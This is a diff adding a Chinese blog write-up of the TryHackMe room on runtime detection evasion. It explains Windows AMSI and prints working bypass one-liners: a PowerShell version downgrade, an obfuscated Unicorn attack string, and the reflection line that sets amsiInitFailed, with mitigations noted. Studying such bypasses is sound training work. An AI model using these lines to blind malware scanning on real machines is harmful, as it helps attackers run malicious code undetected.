@@ -1,0 +1,174 @@
++++
+
+Author = "BadWiChell"
+
+Title = "BypassUAC"
+
+Date = "2024-03-26"
+
+Description = "了解如何使用与工具无关的现代方法绕过常见的运行时检测措施，例如 AMSI。"
+
+Tags = [
+
+"windows",
+
+"Tryhackme",
+
+"绕过 UAC"
+]
+
+Categories = [
+
+"Tryhackme",
+
+]
+
++++
+
+![](https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240401133804.png)
+
+# 房间信息
+
+| 房间名称 | https://tryhackme.com/r/room/runtimedetectionevasion |
+| ---- | ---------------------------------------------------- |
+| 描述   | 运行时检测规避                                              |
+| 难度   | Hard                                                 |
+| 作者   | BadWiChell                                           |
+
+# 任务一
+## 介绍
+
+随着 PowerShell <3 的发布，蓝队 Microsoft 发布了 AMSI（反恶意软件扫描接口），这是一种运行时监控解决方案，旨在阻止和监控持续的威胁。
+
+学习目标
+
+- 了解运行时检测的目的及其检测方式。
+- 学习并应用绕过 AMSI 的技术。
+- 了解常见的缓解措施和潜在的技术替代方案。
+
+在执行恶意代码时，运行时检测措施可能会导致许多麻烦和障碍。幸运的是，作为攻击者，我们可以滥用和利用多种技术和方法来绕过常见的运行时检测解决方案。
+
+# 任务二 
+
+在执行代码或应用程序时，无论解释器如何，它几乎总是会流经运行时。这在使用 Windows API 调用和与 .NET 交互时最常见。CLR（公共语言运行时）和 DLR（动态语言运行时）是 .NET 的运行时，是使用 Windows 系统时最常遇到的运行时。在此任务中，我们不会讨论运行时的细节;相反，我们将讨论如何监控它们并检测恶意代码。
+
+运行时检测度量将在运行时执行之前扫描代码，并确定它是否是恶意的。根据检测措施及其背后的技术，此检测可能基于字符串签名、启发式或行为。如果代码被怀疑是恶意的，它将被分配一个值，如果在指定的范围内，它将停止执行，并可能隔离或删除文件/代码。
+
+运行时检测措施与标准防病毒软件不同，因为它们将直接从内存和运行时进行扫描。同时，防病毒产品还可以利用这些运行时检测来更深入地了解源自代码的调用和钩子。在某些情况下，防病毒产品可能会使用运行时检测流/源作为其启发式方法的一部分。
+
+# 任务三
+
+AMSI（反恶意软件扫描接口）是一项 PowerShell 安全功能，允许任何应用程序或服务直接集成到反恶意软件产品中。Defender 检测 AMSI 以在 .NET 运行时内执行之前扫描有效负载和脚本。来自Microsoft：“Windows 反恶意软件扫描接口 （AMSI） 是一种通用接口标准，它允许您的应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI 为您的最终用户及其数据、应用程序和工作负载提供增强的恶意软件保护。有关 AMSI 的详细信息，请查看 Windows 文档。
+
+AMSI将根据监视和扫描的结果，根据响应代码确定其操作。以下是可能的响应代码列表，
+- AMSI_RESULT_CLEAN = 0
+- AMSI_RESULT_NOT_DETECTED = 1
+- AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
+- AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
+- AMSI_RESULT_DETECTED = 32768
+
+这些响应代码将仅在 AMSI 的后端或通过第三方实现进行报告。如果 AMSI 检测到恶意结果，它将停止执行并发送以下错误消息。
+
+AMSI 已完全集成到以下 Windows 组件中：
+
+- 用户帐户控制或 UAC
+-  PowerShell的
+- Windows 脚本宿主（wscript 和 cscript）
+-  JavaScript 和 VBScript
+-  Office VBA 宏
+
+作为攻击者，在针对上述组件时，我们需要在执行代码或滥用组件时注意 AMSI 及其实现。
+
+在下一个任务中，我们将介绍 AMSI 在 Windows 中的工作原理和检测方式背后的技术细节。
+
+![](https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240401134632.png)
+
+在上图中，数据将开始流动，具体取决于使用的解释器（PowerShell/VBScript/等）当数据在每一层的模型中向动时，将对各种 API 调用和接口进行检测。了解 AMSI 的完整模型很重要，但我们可以将其分解为核心组件，如下图所示。
+
+![](https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240401134914.png)
+注意：仅当从 CLR 执行时从内存加载时，才会检测 AMSI。假定 if on disk MsMpEng.exe （Windows Defender） 已被检测。
+
+我们的大多数研究和已知绕过都放置在 Win32 API 层中，操纵 AmsiScanBuffer API 调用。
+
+您可能还会注意到 AMSI 的“其他应用程序”界面。AV 提供商等第三方可以从其产品中检测 AMSI。Microsoft 记录了 AMSI 函数和 AMSI 流接口。
+
+---
+
+我们可以分解 AMSI PowerShell 检测的代码，以更好地了解其实现方式并检查可疑内容。要查找 AMSI 的检测位置，我们可以使用由 Cobbr 维护的 InsecurePowerShell。InsecurePowerShell 是 PowerShell 的 GitHub 分支，删除了安全功能;这意味着我们可以查看比较的提交并观察任何安全功能。AMSI 仅在 下的 `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs` 12 行代码中进行检测。这十二行如下所示。
+
+```cpp
+var scriptExtent = scriptBlockAst.Extent;
+ if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
+ {
+  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
+  throw new ParseException(new[] { parseError });
+ }
+
+ if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
+ {
+  HasSuspiciousContent = true;
+ }
+
+```
+
+---
+
+我们可以利用我们对 AMSI 如何检测的知识以及其他人的研究来创建和使用滥用和逃避 AMSI 或其实用程序的旁路。
+
+
+# 任务四
+## powershell 降级
+PowerShell 降级攻击是一个非常容易实现的目标，它允许攻击者修改当前的 PowerShell 版本以删除安全功能。  
+
+大多数 PowerShell 会话将从最新的 PowerShell 引擎开始，但攻击者可以使用单行代码手动更改版本。通过将 PowerShell 版本“降级”到 2.0，可以绕过安全功能，因为它们直到 5.0 版才实现。
+
+攻击只需要一行即可在我们的会话中执行。我们可以启动一个新的 PowerShell 进程，其中包含指定版本 （2） `-Version` 的标志。
+
+```powershell
+PowerShell -Version 2
+```
+
+这种攻击可以在 Unicorn 等工具中被积极利用。
+
+```powershell
+full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+```
+
+由于这种攻击唾手可得，而且技术简单，蓝队有很多方法可以检测和缓解这种攻击。
+
+两个最简单的缓解措施是从设备中删除 PowerShell 2.0 引擎，并通过应用程序阻止列表拒绝对 PowerShell 2.0 的访问。
+
+## Powershell 反射
+反射允许用户或管理员访问 .NET 程序集并与之交互。从 Microsoft 文档中，“程序集构成了 . 的部署、版本控制、重用、激活范围和安全权限的基本单元。基于 NET 的应用程序。 .NET 程序集可能看起来很陌生;但是，我们可以通过知道它们以熟悉的格式（如 exe（可执行文件）和 DLL（动态链接库））的形式来使它们更加熟悉。
+
+PowerShell 反射可以被滥用来修改和识别有价值的 DLL 中的信息。
+
+PowerShell 的 AMSI 实用工具存储在位于 中的 `AMSIUtils` `System.Management.Automation.AmsiUtils` .NET 程序集中。
+
+Matt Graeber 发表了一句话，以实现使用 Reflection 修改和绕过 AMSI 实用程序的目标。这行可以在下面的代码块中看到。
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+为了解释代码功能，我们将把它分解成更小的部分。
+
+首先，代码段将调用反射函数并指定它要使用程序 `[Ref.Assembly]` 集，然后使用 `GetType` 获取 AMSI 实用程序的类型。
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+```
+
+从上一节收集的信息将转发到下一个函数，以使用 `GetField` 获取程序集中的指定字段。
+
+```powershell
+.GetField('amsiInitFailed','NonPublic,Static')
+```
+
+然后，程序集和字段信息将转发到下一个参数，以将值从 `$false` 设置为 `$true` using `SetValue` 。
+
+```powershell
+.SetValue($null,$true)
+```
+
+一旦 `amsiInitFailed` 该字段设置为 `$true` ，AMSI 将使用响应代码进行响应：AMSI_RESULT_NOT_DETECTED = 1
